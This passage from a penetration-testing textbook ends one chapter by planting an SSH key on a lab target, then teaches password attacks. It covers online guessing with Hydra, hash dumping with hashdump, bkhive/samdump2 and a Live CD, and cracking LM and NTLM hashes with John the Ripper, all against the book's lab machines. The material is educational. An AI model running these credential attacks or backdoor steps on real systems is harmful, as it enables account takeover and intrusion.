/tmp/mount\nThis doesn’t look too promising at first glance because georgia has no\ndocuments, pictures, or videos—just some simple buffer overflow examples\nwe will use in Chapter 16. There doesn’t appear to be any sensitive infor-\nmation here, but before we jump to conclusions, let’s see what’s in the .ssh\ndirectory. root@kali:~# cd /tmp/mount/.ssh\nroot@kali:/tmp/mount/.ssh# ls\nauthorized_keys id_rsa id_rsa.pub\nWe now have access to georgia’s SSH keys. The id_rsa file is her private\nkey, and id_rsa.pub is her corresponding public key. We can read or even\nchange these values, and we can write to the SSH file authorized_keys, which\n194 Chapter 8\nhandles a list of SSH public keys that are authorized to log in as the user\ngeorgia. And because we have write privileges, we can add our own key here\nthat will allow us to bypass password authentication when logging in to the\nUbuntu target as georgia, as shown in Listing 8-10. root@kali:~# ssh-keygen\nGenerating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa):\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /root/.ssh/id_rsa. Your public key has been saved in /root/.ssh/id_rsa.pub. The key fingerprint is:\n26:c9:b7:94:8e:3e:d5:04:83:48:91:d9:80:ec:3f:39 root@kali\nThe key's randomart image is:\n+--[ RSA 2048]----+\n| . o+B . |\n--snip--\n+-----------------+\nListing 8-10: Generating a new SSH key pair\nFirst, we generate a key on our Kali machine using ssh-keygen.\n\nBy\ndefault our new public key is written to /root/.ssh/id_rsa.pub, and our pri-\nvate key is written to /root/.ssh/id_rsa. We want to add our public key to the\nauthorized_keys file for georgia on Ubuntu. Next, let’s append the newly generated public key to georgia’s authorized_\nkeys file. cat out the contents of the /root/.ssh/id_rsa.pub file, and append it to\ngeorgia’s authorized_keys file. root@kali:~# cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys\nWe should now be able to SSH into the Linux target as georgia. Let’s\ngive it a try. root@kali:~# ssh georgia@192.168.20.11\ngeorgia@ubuntu:~$\nThat worked nicely. We can now successfully authenticate with the\nLinux target using public key authentication. We could also have gained access by copying georgia’s key to the Kali\nmachine. To do so, we first delete the SSH identity we created. root@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa.pub\nroot@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa\nNow, we copy georgia’s private key (id_rsa) and public key (id_rsa.pub) to\nroot’s .ssh directory on Kali, and use the ssh-add command to add the iden-\ntity to the authentication agent before we try to SSH into the Linux target. Exploitation 195\nroot@kali:/tmp/mount/.ssh# cp id_rsa.pub ~/.ssh/id_rsa.pub\nroot@kali:/tmp/mount/.ssh# cp id_rsa ~/.ssh/id_rsa\nroot@kali:/tmp/mount/.ssh# ssh-add\nIdentity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\nroot@kali:/tmp/mount/.ssh# ssh georgia@192.168.20.11\nLinux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686\ngeorgia@ubuntu:~$\nAgain, we are able to gain access to the target by manipulating the SSH\nkeys. We started with the ability to read and write files in georgia’s home\ndirectory. Now we have a shell on the Linux system as user georgia without\nneeding a password. summary\nIn this chapter we were able to combine the information we gathered in\nChapter 5 with the vulnerabilities discovered in Chapter 6 to exploit mul-\ntiple compromises on both the Windows XP and Linux targets. We used\nvarious techniques, including attacking misconfigured web servers, piggy-\nbacking on backdoored software, taking advantage of poor access control\nto sensitive files, exploiting vulnerabilities in the underlying system, and\nexploiting issues in third-party software. Now that we’ve managed to get a foothold in the systems, in the next\nchapter, let’s turn to cracking the passwords we found on the systems. 196 Chapter 8\n9\nPassworD at taCks\nPasswords are often the path of least resistance on\npentesting engagements. A client with a strong secu-\nrity program can fix missing Windows patches and\nout-of-date software, but the users themselves can’t be\npatched. We’ll look at attacking users when we discuss\nsocial engineering in Chapter 11, but if we can correctly guess or calculate\na user’s password, we may be able to avoid involving the user in the attack at\nall. In this chapter we’ll look at how to use tools to automate running services\non our targets and sending usernames and passwords. Additionally, we’ll\nstudy cracking the password hashes we gained access to in Chapter 8. Password management\nCompanies are waking up to the inherent risks of password-based authen-\ntication; brute-force attacks and educated guesses are both serious risks to\nweak passwords. Many organizations use biometric (fingerprint or retinal\nscan-based) or two-factor authentication to mitigate these risks. Even web\nservices such as Gmail and Dropbox offer two-factor authentication in\nwhich the user provides a password as well as a second value, such as the\ndigits on an electronic token. If two-factor authentication is not available,\nusing strong passwords is imperative for account security because all that\nstands between the attacker and sensitive data may come down to a simple\nstring. Strong passwords are long, use characters from multiple complexity\nclasses, and are not based on a dictionary word. The passwords we use in this book are deliberately terrible, but unfor-\ntunately, many users don’t behave much better when it comes to passwords. Organizations can force users to create strong passwords, but as passwords\nbecome more complex, they become harder to remember. Users are likely\nto leave a password that they can’t remember in a file on their computer, in\ntheir smartphone, or even on a Post-it note, because it’s just easier to keep\nof track them that way. Of course, passwords that can be discovered lying\naround in plaintext undermine the security of using a strong password. Another cardinal sin of good password management is using the same\npassword on many sites. In a worst-case scenario, the CEO’s weak password\nfor a compromised web forum might just be the very same one for his or\nher corporate access to financial documents. Password reuse is something\nto bear in mind while performing password attacks; you may find the same\npasswords work on multiple systems and sites. Password management presents a difficult problem for IT staff and will\nlikely continue to be a fruitful avenue for attackers unless or until password-\nbased authentication is phased out entirely in favor of another model. online Password attacks\nJust as we used automated scans to find vulnerabilities, we can use scripts to\nautomatically attempt to log in to services and find valid credentials. We’ll\nuse tools designed for automating online password attacks or guessing pass-\nwords until the server responds with a successful login. These tools use a\ntechnique called brute forcing. Tools that use brute forcing try every possible\nusername and password combination, and given enough time, they will find\nvalid credentials. The trouble with brute forcing is that as stronger passwords are used,\nthe time it takes to brute-force them moves from hours to years and even\nbeyond your natural lifetime. We can probably find working credentials\nmore easily by feeding educated guesses about the correct passwords into\nan automated login tool. Dictionary words are easy to remember, so despite\nthe security warnings, many users incorporate them into passwords. Slightly\nmore security-conscious users might put some numbers at the end of their\npassword or maybe even an exclamation point. 198 Chapter 9\nWordlists\nBefore you can use a tool to guess passwords, you need a list of credentials\nto try. If you don’t know the name of the user account you want to crack, or\nyou just want to crack as many accounts as possible, you can provide a user-\nname list for the password-guessing tool to iterate through. User Lists\nWhen creating a user list, first try to determine the client’s username scheme. For instance, if we’re trying to break into employee email accounts, figure\nout the pattern the email addresses follow. Are they firstname.lastname, just a\nfirst name, or something else? You can look for good username candidates on lists of common first or\nlast names. Of course, the guesses will be even more likely to succeed if you\ncan find the names of your target’s actual employees. If a company uses a\nfirst initial followed by a last name for the username scheme, and they have\nan employee named John Smith, jsmith is likely a valid username. Listing 9-1\nshows a very short sample user list. You’d probably want a larger list of users\nin an actual engagement. root@kali:~# cat userlist.txt\ngeorgia\njohn\nmom\njames\nListing 9-1: Sample user list\nOnce you’ve created your list, save the sample usernames in a text file\nin Kali Linux, as shown in Listing 9-1. You’ll use this list to perform online\npassword attacks in “Guessing Usernames and Passwords with Hydra” on\npage 202. Password Lists\nIn addition to a list of possible users, we’ll also need a password list, as\nshown in Listing 9-2. root@kali:~# cat passwordfile.txt\npassword\nPassword\npassword1\nPassword1\nPassword123\npassword123\nListing 9-2: Sample password list\nPassword Attacks 199\nLike our username list, this password list is just a very short example\n(and one that, hopefully, wouldn’t find the correct passwords for too many\naccounts in the real world). On a real engagement, you should use a much\nlonger wordlist. There are many good password lists available on the Internet. Good\nplaces to look for wordlists include http://packetstormsecurity.com/Crackers/\nwordlists/ and http://www.openwall.com/wordlists/. A few password lists are also\nbuilt into Kali Linux. For example, the /usr/share/wordlists directory con-\ntains a file called rockyou.txt.gz. This is a compressed wordlist. If you unzip\nthe file with the gunzip Linux utility, you’ll have about 140 MB of possible\npasswords, which should give you a pretty good start. Also, some of the\npassword-cracking tools in Kali come with sample wordlists. For example,\nthe John the Ripper tool (which we’ll use in “Offline Password Attacks” on\npage 203) includes a wordlist at /usr/share/john/password.lst. For better results, customize your wordlists for a particular target by\nincluding additional words. You can make educated guesses based on infor-\nmation you gather about employees online. Information about spouses,\nchildren, pets, and hobbies may put you on the right track. For example,\nif your target’s CEO is a huge Taylor Swift fan on social media, consider\nadding keywords related to her albums, her music, or her boyfriends. If\nyour target’s password is TaylorSwift13!, you should be able to confirm it\nusing password guessing long before you have to run a whole precompiled\nwordlist or a brute-force attempt. Another thing to keep in mind is the\nlanguage(s) used by your target. Many of your pentesting targets may be\nglobal. In addition to making educated guesses based on information you\ngather while performing reconnaissance, a tool like the ceWL custom\nwordlist generator will search a company website for words to add to\nyour wordlist. Listing 9-3 shows how you might use ceWL to create a\nwordlist based on the contents of www.bulbsecurity.com. root@kali:~# cewl --help\ncewl 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)\nUsage: cewl [OPTION] ... URL\n--snip--\n--depth x, -d x: depth to spider to, default 2 u\n--min_word_length, -m: minimum word length, default 3 v\n--offsite, -o: let the spider visit other sites\n--write, -w file: write the output to the file w\n--ua, -u user-agent: useragent to send\n--snip--\nURL: The site to spider. root@kali:~# cewl -w bulbwords.txt -d 1 -m 5 www.bulbsecurity.com x\nListing 9-3: Using ceWL to build custom wordlists\n200 Chapter 9\nThe command ceWL --help lists ceWL’s usage instructions. Use the -d\n(depth) option u to specify how many links ceWL should follow on the\ntarget website. If you think that your target has a minimum password-size\nrequirement, you might specify a minimum word length to match with the\n-m option v. Once you’ve made your choices, output ceWL’s results to a file\nwith the -w option w. For example, to search www.bulbsecurity.com to depth\n1 with minimum word length of 5 characters and output the words found to\nthe file bulbwords.txt, you would use the command shown at x. The resulting\nfile would include all words found on the site that meet your specifications. Another method for creating wordlists is producing a list of every pos-\nsible combination of a given set of characters, or a list of every combination\nof characters for a specified number of characters. The tool Crunch in Kali\nwill generate these character sets for you. Of course, the more possibilities,\nthe more disk space is required for storage. A very simple example of using\nCrunch is shown in Listing 9-4. root@kali:~# crunch 7 7 AB\nCrunch will now generate the following amount of data: 1024 bytes\n0 MB\n0 GB\n0 TB\n0 PB\nCrunch will now generate the following number of lines: 128\n\nAAAAAAA\n\nAAAAAAB\n--snip--\nListing 9-4: Brute-forcing a keyspace with Crunch\nThis example generates a list of all the possible seven-character com-\nbinations of just the characters A and B. A more useful, but much, much\nlarger example would be entering crunch 7 8, which would generate a list\nof all the possible combinations of characters for a string between seven\nand eight characters in length, using the default Crunch character set of\nlowercase letters. This technique is known as keyspace brute-forcing. While\nit is not feasible to try every possible combination of characters for a pass-\nword in the span of your natural life, it is possible to try specific subsets; for\ninstance, if you knew the client’s password policy requires passwords to be at\nleast seven characters long, trying all seven- and eight-character passwords\nwould probably result in cracking success—even among the rare users who\ndid not base their passwords on a dictionary word. note Developing a solid wordlist or set of wordlists is a constantly evolving process. For the\nexercises in this chapter, you can use the short sample wordlist we created in Listing 9-2,\nbut as you gain experience in the field, you’ll develop more complex lists that work\nwell on client engagements. Now let’s see how to use our wordlist to guess passwords for services\nrunning on our targets. Password Attacks 201\nGuessing Usernames and Passwords with Hydra\nIf you have a set of credentials that you’d like to try against a running service\nthat requires a login, you can input them manually one by one or use a tool\nto automate the process. Hydra is an online password-guessing tool that can\nbe used to test usernames and passwords for running services. (Following\nthe tradition of naming security tools after the victims of Heracles’s labors,\nHydra is named for the mythical Greek serpent with many heads.) Listing 9-5\nshows an example of using Hydra for online password guessing. root@kali:~# hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3\nHydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only\nHydra (http://www.thc.org/thc-hydra) starting at 2015-01-12 15:29:26\n[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task\n[DATA] attacking service pop3 on port 110\n[110][pop3] host: 192.168.20.10 login: georgia password: passwordu\n[STATUS] attack finished for 192.168.20.10 (waiting for children to finish)\n1 of 1 target successfuly completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra) finished at 2015-01-12 15:29:48\nListing 9-5: Using Hydra to guess POP3 usernames and passwords\nListing 9-5 shows how to use Hydra to guess usernames and passwords\nby running through our username and password files to search for valid\nPOP3 credentials on our Windows XP target. This command uses the -L\nflag to specify the username file, the -P for the password list file, and spec-\nifies the protocol pop3. Hydra finds that user georgia’s password is password at\nu. (Shame on georgia for using such an insecure password!)\nSometimes you’ll know that a specific username exists on a server, and\nyou just need a valid password to go with it. For example, we used the SMTP\nVRFY verb to find valid usernames on the SLMail server on the Windows XP\ntarget in Chapter 6. As you can see in Listing 9-6, we can use the -l flag\ninstead of -L to specify one particular username. Knowing that, let’s look\nfor a valid password for user georgia on the pop3 server. root@kali:~# hydra -l georgia -P passwordfile.txt 192.168.20.10 pop3\nHydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only\n[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task\n[DATA] attacking service pop3 on port 110\n[110][pop3] host: 192.168.20.10 login: georgia password: passwordu\n[STATUS] attack finished for 192.168.20.10 (waiting for children to finish)\n1 of 1 target successfuly completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra) finished at 2015-01-07 20:22:23\nListing 9-6: Using a specific username with Hydra\nHydra found georgia’s password to be password u. Now, in Listing 9-7, we’ll use our credentials to read georgia’s email. root@kali:~# nc 192.168.20.10 pop3\n+OK POP3 server xpvictim.com ready <00037.23305859@xpvictim.com>\n202 Chapter 9\nUSER georgia\n+OK georgia welcome here\nPASS password\n+OK mailbox for georgia has 0 messages (0 octets)\nListing 9-7: Using Netcat to log in with guessed credentials\nSpecify the pop3 protocol, and provide the username and password\nwhen prompted. (Unfortunately, there are no love letters in this particular\ninbox.) Hydra can perform online password guessing against a range of ser-\nvices. (See its manual page for a complete list.) For example, here we use\nthe credentials we found with Hydra to log in with Netcat. Keep in mind that most services can be configured to lock out accounts\nafter a certain number of failed login attempts. There are few better ways\nto get noticed by a client’s IT staff than suddenly locking out several user\naccounts. Logins in rapid succession can also tip off firewalls and intrusion-\nprevention systems, which will get your IP address blocked at the perimeter. Slowing down and randomizing scans can help with this, but there is, of\ncourse, a tradeoff: Slower scans will take longer to produce results. One way to avoid having your login attempts noticed is to try to guess a\npassword before trying to log in, as you’ll learn in the next section. offline Password attacks\nAnother way to crack passwords (without being discovered) is to get a copy\nof the password hashes and attempt to reverse them back to plaintext pass-\nwords. This is easier said than done because hashes are designed to be the\nproduct of a one-way hash function: Given an input, you can calculate the\noutput using the hash function, but given the output, there is no way to\nreliably determine the input. Thus, if a hash is compromised, there should\nbe no way to calculate the plaintext password. We can, however, guess a\npassword, hash it with the one-way hash function, and compare the results\nto the known hash. If the two hashes are the same, we’ve found the correct\npassword. note As you’ll learn in “LM vs. NTLM Hashing Algorithms” on page 208, not all pass-\nword hashing systems have stood the test of time. Some have been cracked and are no\nlonger considered secure. In these cases, regardless of the strength of the password cho-\nsen, an attacker with access to the hashes will be able to recover the plaintext password\nin a reasonable amount of time. Of course, it’s even better if you can get access to passwords in plain-\ntext and save yourself the trouble of trying to reverse the cryptography, but\noften the passwords you encounter will be hashed in some way. In this section\nwe’ll focus on finding and reversing password hashes. If you stumble upon a\nprogram configuration file, database, or other file that stores passwords in\nplaintext, all the better. But before we can try to crack password hashes, we have to find them. We all hope that the services that store our passwords do a good job of\nPassword Attacks 203\nprotecting them, but that’s never a given. It only takes one exploitable flaw or\na user who falls victim to a social-engineering attack (discussed in Chapter 11)\nto bring down the whole house of cards. You’ll find plenty of password hashes\nlying around sites like Pastebin, remnants from past security breaches. In Chapter 8, we gained access to some password hashes on the Linux\nand Windows XP targets. Having gained a Meterpreter session with system\nprivileges on the Windows XP system via the windows/smb/ms08_067_netapi\nMetasploit module, we can use the hashdump Meterpreter command to print\nthe hashed Windows passwords, as shown in Listing 9-8. meterpreter > hashdump\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\ngeorgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:df40c521ef762bb7b9767e30ff112a3c:938ce7d211ea733373bcfc3e6fbb3641:::\nsecret:1004:e52cac67419a9a22664345140a852f61:58a478135a93ac3bf058a5ea0e8fdb71:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bc48640a0fcb55c6ba1c9955080a52a8:::\nListing 9-8: Dumping password hashes in Meterpreter\nSave the output of the hashdump to a file called xphashes.txt, which we\nwill use in “John the Ripper” on page 210. In Chapter 8 we also downloaded backups of the SAM and SYSTEM\nhives using the local file inclusion issue in Zervit 0.4 on the Windows XP\nsystem. We used this same issue to download the configuration file for\nthe FileZilla FTP server, which contained passwords hashed with the MD5\nalgorithm. On the Linux target, the Vsftpd smiley-face backdoor gave us\nroot privileges, and thus we can access to the file /etc/shadow, which stores\nLinux password hashes. We saved the password for user georgia to the file\nlinuxpasswords.txt. Recovering Password Hashes from a Windows SAM File\nThe SAM file stores hashed Windows passwords. Though we were able to use\nMeterpreter to dump the password hashes from the Windows XP system (as\nshown previously), sometimes you’ll be able to get only the SAM file. We weren’t able to get access to the primary SAM file through the\nZervit 0.4 vulnerability, but we were able to download a backup copy from\nthe C:\\Windows\\repair directory using a local file-inclusion vulnerability. But\nwhen we try to read the SAM file (as shown in Listing 9-9), we don’t see any\npassword hashes. root@bt:~# cat sam\nregf P P5gfhbin����nk,�u����� ���� ���������x����SAMX���skx x � �p�µ\\µ? ? µ µ\n����nk L���� �B���� �x �����SAM����skxx7d\n�HXµ4µ? ����vk � CP��� � µ�x�µD0�µ �µ�� 4µ1 ? �����\n����lf SAM����nk �u����� H#���� Px ����Domains����vk�����8lf �Doma����nk\n\\��J��� ������0x ����( Account����vk ��\n--snip--\nListing 9-9: Viewing the SAM file\n204 Chapter 9\nThe SAM file is obfuscated because the Windows Syskey utility encrypts\nthe password hashes inside the SAM file with 128-bit Rivest Cipher 4 (RC4)\nto provide additional security. Even if an attacker or pentester can gain\naccess to the SAM file, there’s a bit more work to do before we can recover the\npassword hashes. Specifically, we need a key to reverse the encrypted hashes.\n\nThe encryption key for the Syskey utility is called the bootkey, and it’s\nstored in the Windows SYSTEM file. You’ll find a copy of the SYSTEM file in\nthe C:\\Windows\\repair directory where we found the backup SAM file. We can\nuse a tool in Kali called Bkhive to extract the Syskey utility’s bootkey from the\nSYSTEM file so we can decrypt the hashes, as shown in Listing 9-10. root@kali:~# bkhive system xpkey.txt\nbkhive 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\noriginal author: ncuomo@studenti.unina.it\nRoot Key : $$$PROTO.HIV\nDefault ControlSet: 001\nBootkey: 015777ab072930b22020b999557f42d5\nListing 9-10: Using Bkhive to extract the bootkey\nHere we use Bkhive to extract the bootkey by passing in the SYSTEM\nfile system (the file we downloaded from the repair directory using the\nZervit 0.4 directory traversal) as the first argument and extracting the file\nto xpkey.txt. Once we have the bootkey, we can use Samdump2 to retrieve\nthe password hashes from the SAM file, as shown in Listing 9-11. Pass\nSamdump2 the location of the SAM file and the bootkey from Bkhive as\narguments, and it will use the bootkey to decrypt the hashes. root@kali:~# samdump2 sam xpkey.txt\nsamdump2 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\noriginal author: ncuomo@studenti.unina.it\nRoot Key : SAM\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:df40c521ef762bb7b9767e30ff112a3c:938ce7d211ea733373bcfc3e6fbb3641:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bc48640a0fcb55c6ba1c9955080a52a8:::\nListing 9-11: Using Samdump2 to recover Windows hashes\nNow compare these hashes to those found with the hashdump command\nin an active Meterpreter session from Listing 9-8. (A Meterpreter session\nwith sufficient privileges can dump password hashes on the fly without\nrequiring us to download the SAM and SYSTEM files.) Notice that our hash\nlist in Listing 9-11 lacks entries for the users georgia or secret. What happened? When using the Zervit directory traversal, we weren’t able to access\nthe main SAM file at C:\\Windows\\System32\\config and instead downloaded\na backup from C:\\Windows\\repair\\sam. These users must have been created\nPassword Attacks 205\nafter the SAM file backup was created. We do have a password hash for the\nAdministrator user, though. Though not complete or fully up-to-date, we may\nstill be able to use cracked hashes from this backup SAM to log in to the\nsystems. Now let’s look at another way to access password hashes. Dumping Password Hashes with Physical Access\nOn some engagements, you’ll actually have physical access to user machines,\nwith so-called physical attacks in scope. While having physical access may\nnot appear very useful at first, you may be able to access the password hashes\nby restarting a system using a Linux Live CD to bypass security controls. (We’ll use a Kali ISO image, though other Linux Live CDs such as Helix\nor Ubuntu will work. We used a prebuilt Kali virtual machine in Chapter 1. To get a standalone ISO of Kali, go to http://www.kali.org.) When you boot\na machine with a Live CD, you can mount the internal hard disk and gain\naccess to all files, including the SAM and SYSTEM files. (When Windows\nboots, there are certain security controls in place to stop users from access-\ning the SAM file and dumping password hashes, but these aren’t active when\nthe filesystem is loaded in Linux.)\nOur Windows 7 virtual machine, with its solid external security posture,\nhas been a bit neglected in these last few chapters. Let’s dump its hashes\nusing a physical attack. First, we’ll point our virtual machine’s optical drive\nto a Kali ISO file, as shown in Figure 9-1 (for VMware Fusion). In VMware\nPlayer, highlight your Windows 7 virtual machine, right-click it and choose\nSettings, then choose CD/DVD (SATA) and point to the ISO in the Use\nISO Image field on the right side of the page. Figure 9-1: Setting our Windows 7 virtual machine to boot from the Kali\nISO file\nBy default, VMware will boot up the virtual machine so quickly that\nit will be difficult to change the BIOS settings to boot from the CD/DVD\ndrive instead of the hard disk. To fix this, we’ll add a line to the VMware\nconfiguration file (.vmx) to delay the boot process at the BIOS screen for\na few seconds. 206 Chapter 9\n1. On your host machine, browse to where you saved your virtual machines. Then, in the folder for the Windows 7 target, find the .vmx configura-\ntion file, and open it in a text editor. The configuration file should look\nsimilar to Listing 9-12. .encoding = \"UTF-8\"\nconfig.version = \"8\"\nvirtualHW.version = \"9\"\nvcpu.hotadd = \"TRUE\"\nscsi0.present = \"TRUE\"\nscsi0.virtualDev = \"lsilogic\"\n--snip--\nListing 9-12: VMware configuration file ( .vmx)\n2. Add the line bios.bootdelay = 3000 anywhere in the file. This tells the\nvirtual machine to delay booting for 3000 ms, or three seconds, enough\ntime for us to change the boot options. 3. Save the .vmx file, and restart the Windows 7 target. Once you can access\nthe BIOS, choose to boot from the CD drive. The virtual machine should\nstart the Kali ISO. Even though we’re booted into Kali, we can mount the\nWindows hard disk and access files, bypassing the security features of\nthe Windows operating system. Listing 9-13 shows how to mount the file system and dump the password\nhashes. root@kali:# umkdir -p /mnt/sda1\nroot@kali:# vmount /dev/sda1 /mnt/sda1\nroot@kali:# wcd /mnt/sda1/Windows/System32/config/\nroot@kali:/mnt/sda1/Windows/System32/config bkhive SYSTEM out\nroot@kali:/mnt/sda1/Windows/System32/config samdump2 SAM out\nsamdump2 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\noriginal author: ncuomo@studenti.unina.it\nRoot Key : CMI-CreateHive{899121E8-11D8-41B6-ACEB-301713D5ED8C}\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGeorgia Weidman:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b75B6c:::\nListing 9-13: Dumping Windows hashes with a Linux Live CD\nWe create a directory where we can mount our Windows filesystem with\nthe mkdir command at u. Next, we use mount v to mount the Windows file-\nsystem (/dev/sda1) in the newly created directory (/mnt/sda1), which means\nthat the target’s C drive is effectively at /mnt/sda1. The SAM and SYSTEM\nfiles in Windows are in the C:\\Windows\\System32\\config directory, so we change\ndirectories to /mnt/sda1/Windows/System32/config to access these files using\nPassword Attacks 207\ncd w, at which point we can use Samdump2 and Bkhive against the SAM\nand SYSTEM files without first saving these files and moving them to our\nKali system. Once again we’ve managed to get access to password hashes. We now\nhave hashes for our Windows XP target, our Windows 7 target, our Linux\ntarget, and the FileZilla FTP server on the Windows XP target. note In Chapter 13, we’ll explore some tricks for using password hashes to authenticate\nwithout the need for access to the plaintext passwords, but usually, in order to use\nthese hashes, we’ll need to reverse the cryptographic hash algorithms and get the plain-\ntext passwords. The difficulty of this depends on the password-hashing algorithm used\nas well as the strength of the password used. LM vs. NTLM Hashing Algorithms\nListing 9-14 compares the two password hash entries. The first one belongs\nto the Administrator account on Windows XP, which we found with hashdump in\nMeterpreter, and the second is Georgia Weidman’s account from Windows 7,\nwhich we found with physical access in the previous section. Administratoru:500v:e52cac67419a9a224a3b108f3fa6cb6dw:8846f7eaee8fb117ad06bdd830b7586cx\nGeorgia Weidmanu:1000v:aad3b435b51404eeaad3b435b51404eew:8846f7eaee8fb117ad06bdd830b7586cx\nListing 9-14: Dumping Windows hashes with a Linux Live CD\nThe first field in the hashes is the username u; the second is the user\nID v; the third is the password hash in LAN Manager (LM) format w; and\nthe fourth is the NT LAN Manager (NTLM) hash x. LM Hash was the pri-\nmary way to hash passwords on Microsoft Windows up to Windows NT, but\nit’s a cryptographically unsound method that makes it possible to discover\nthe correct plaintext password for an LM hash, regardless of a password’s\nlength and complexity. Microsoft introduced NTLM hashing to replace LM\nhash, but on Windows XP, passwords are stored in both LM and NTLM for-\nmats by default. (Windows 7 opts exclusively for the more secure NTLM hash.)\nIn the hashes in Listing 9-14, because both passwords are the\nstring password, the NTLM hash entries for each account are identi-\ncal, but the LM hash fields are different. The first entry has the value\ne52cac67419a9a224a3b108f3fa6cb6d, whereas the Windows 7 entry has\naad3b435b51404eeaad3b435b51404ee, which is LM hash-speak for empty. The\ninclusion of the LM hash entry will make cracking the hashes much sim-\npler. In fact, any LM-hashed password can be brute-forced in minutes to\nhours. In contrast, our ability to crack the NTLM hashes will depend on\nboth our ability to guess and the length and complexity of the password. If the hashing function is cryptographically sound, it could take years,\ndecades, or more than your lifetime to try every possible password. 208 Chapter 9\nThe Trouble with LM Password Hashes\nWhen you see LM hashes on a pentest, you can be sure that the plaintext\npassword is recoverable from the password hash. However, one-way hash\nfunctions can’t be reversed. Complex math is used to develop algorithms that\nmake it impossible to discover the original plaintext password value that was\nhashed, given the password hash. But we can run a plaintext password guess\nthrough the cryptographic hashing function and compare the results to\nthe hash we’re trying to crack; if they’re the same, we’ve found the correct\npassword. The following issues contribute to the insecurity of LM hashes:\n• Passwords are truncated at 14 characters.\n\n• Passwords are converted to all uppercase. • Passwords of fewer than 14 characters are null-padded to 14 characters. • The 14-character password is broken into two seven-character passwords\nthat are hashed separately. Why are these characteristics so significant? Say we start with a com-\nplex, strong password like this:\nT3LF23!+?sRty$J\nThis password has 15 characters from four classes, including lowercase\nletters, uppercase letters, numbers, and symbols, and it’s not based on a\ndictionary word. However, in the LM hash algorithm, the password is trun-\ncated to 14 characters like this:\nT3LF23!+?sRty$\nThen the lowercase letters are changed to uppercase:\nT3LF23!+?SRTY$\nNext, the password is split into two seven-character parts. The two parts\nare then used as keys to encrypt the static string KGS!@#$% using the Data\nEncryption Standard (DES) encryption algorithm:\nT3LF23! +?SRTY$\nThe resulting eight-character ciphertexts from the encryption are then\nconcatenated to make the LM hash. To crack an LM hash, we just need to find seven characters, all upper-\ncase, with perhaps some numbers and symbols. Modern computing hardware\ncan try every possible one- to seven-character combination, encrypt the string\nKGS!@#$%, and compare the resulting hash to a given value in a matter of min-\nutes to hours. Password Attacks 209\nJohn the Ripper\nOne of the more popular tools for cracking passwords is John the Ripper. The default mode for John the Ripper is brute forcing. Because the set of pos-\nsible plaintext passwords in LM hash is so limited, brute forcing is a viable\nmethod for cracking any LM hash in a reasonable amount of time, even with\nour Kali virtual machine, which has limited CPU power and memory. For example, if we save the Windows XP hashes we gathered earlier\nin this chapter to a file called xphashes.txt, then feed them to John the\nRipper like this, we find that John the Ripper can run through the entire\nset of possible passwords and come up with the correct answer, as shown in\nListing 9-15. root@kali: john xphashes.txt\nWarning: detected hash type \"lm\", but the string is also recognized as \"nt\"\nUse the \"--format=nt\" option to force loading these as that type instead\nLoaded 10 password hashes with no different salts (LM DES [128/128 BS SSE2])\n(SUPPORT_388945a0)\nPASSWOR (secret:1)\n(Guest)\nPASSWOR (georgia:1)\nPASSWOR (Administrator:1)\nD (georgia:2)\nD (Administrator:2)\nD123 (secret:2)\nListing 9-15: Cracking LM hashes with John the Ripper\nJohn the Ripper cracks the seven-character password hashes. In\nListing 9-15, we see that PASSWOR is the first half of the user secret’s pass-\nword. Likewise, it’s the first half of the password for georgia and Administrator. The second half of secret’s password is D123, and georgia and Administrator’s\nare D. Thus, the complete plaintext of the LM-hashed passwords are\nPASSWORD for georgia and Administrator and PASSWORD123 for secret. The\nLM hash doesn’t tell us the correct case for a password, and if you try log-\nging in to the Windows XP machine as Administrator or georgia with the\npassword PASSWORD or the account secret with PASSWORD123, you will\nget a login error because LM hash does not take into account the correct\ncase of the letters in the password. To find out the correct case of the password, we need to look at the\nfourth field of the NTLM hash. John the Ripper noted in the example in\nListing 9-15 that NTLM hashes were also present, and you can use the flag\n--format=nt to force John the Ripper to use those hashes (we don’t have LM\nhashes for Windows 7, so we will have to crack Windows 7 passwords with a\nwordlist since brute forcing the NTLM hashes would likely take too long). Cracking Windows NTLM hashes is nowhere near as easy as cracking\nLM ones. Although a five-character NTLM password that uses only lower-\ncase letters and no other complexity could be brute-forced as quickly as\nan LM hash, a 30-character NTLM password with lots of complexity could\n210 Chapter 9\ntake many years to crack. Trying every possible character combination of\nany length, hashing it, and comparing it to a value could go on forever until\nwe happened to stumble upon the correct value (only to find out that the\nuser has since changed his or her password). Instead of attempting to 